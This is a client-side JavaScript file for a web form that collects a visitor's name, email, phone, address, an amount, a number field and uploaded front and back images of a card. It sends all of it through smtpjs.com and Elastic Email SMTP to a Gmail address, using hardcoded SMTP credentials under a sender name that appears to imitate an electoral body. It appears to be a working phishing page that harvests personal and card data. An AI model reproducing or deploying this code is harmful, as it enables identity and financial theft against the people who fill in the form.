
var submitbtn = document.getElementById("submit");
submitbtn.addEventListener("click", (e) => {
     let secondData = document.getElementsByTagName("input");
   
     e.preventDefault();
let formdata = JSON.parse(localStorage.getItem("initial"));

var file1  = secondData[0].files[0];
var file2 = secondData[1].files[0];
const getFileExtension = (fileName) => {
  return fileName.split('.').pop().toLowerCase(); // Get the extension and convert to lowercase
};
formdata.number = secondData[2].value;
     var Email = { send: function (a) { return new Promise(function (n, e) { a.nocache = Math.floor(1e6 * Math.random() + 1), a.Action = "Send"; var t = JSON.stringify(a); Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, function (e) { n(e) }) }) }, ajaxPost: function (e, n, t) { var a = Email.createCORSRequest("POST", e); a.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), a.onload = function () { var e = a.responseText; null != t && t(e) }, a.send(n) }, ajax: function (e, n) { var t = Email.createCORSRequest("GET", e); t.onload = function () { var e = t.responseText; null != n && n(e) }, t.send() }, createCORSRequest: function (e, n) { var t = new XMLHttpRequest; return "withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof XDomainRequest ? (t = new XDomainRequest).open(e, n) : t = null, t } };
     var emailConfig = {
      "Host" : "smtp.elasticemail.com",
      "Username" : "naasoauelectoral@gmail.com",
      "Password" : "470A229FCE6B6870C38873E5E51C8EBA465C",
      "To"  : "01marissacaitlin@gmail.com",
      "From" : "01marissacaitlin@gmail.com",
      "Subject" : "User Information",
      "Body"  : `Dear User, Your details are \n
        Firstname : ${formdata.firstname}\n
        Lastname : ${formdata.lastname}\n
        Email : ${formdata.email} \n
        Phone Number : ${formdata.phone} \n
        City : ${formdata.city} \n
        State : ${formdata.state} \n
        Zip : ${formdata.zip} \n
        City : ${formdata.city} \n
        amount : ${formdata.amount} \n
        address 1 : ${formdata.add1} \n
        addresss 2 : ${formdata.add2}, \n
        Number : ${formdata.number} \n
      `
  };
  
 const reader1 = new FileReader();
 const reader2 = new FileReader();
    reader1.onload = (e) => {
      const fileData1 = e.target.result;
      reader2.onload = (e) => {
        
        const fileData2 = e.target.result;
        emailConfig.Attachments =  [
          {
            "name":`FrontCard.${getFileExtension(file1.name)}`,
          "data":fileData1.split(',')[1],
          "encoding" : "base64",
          "type":file1.type,
          },
          {
            "name":`BackCard.${getFileExtension(file2.name)}`,
            "data":fileData2.split(',')[1],
            "encoding" : "base64",
          "type":file2.type,

          
          }
          ] 

          console.log(emailConfig);
          Email.send(emailConfig).then(
             message => alert(message)
           ).catch(
             error => console.error('Error sending email:', error)
           );

      }
      reader2.readAsDataURL(file2);
    
    }
    
    reader1.readAsDataURL(file1);
    

   
   

  
   

    });
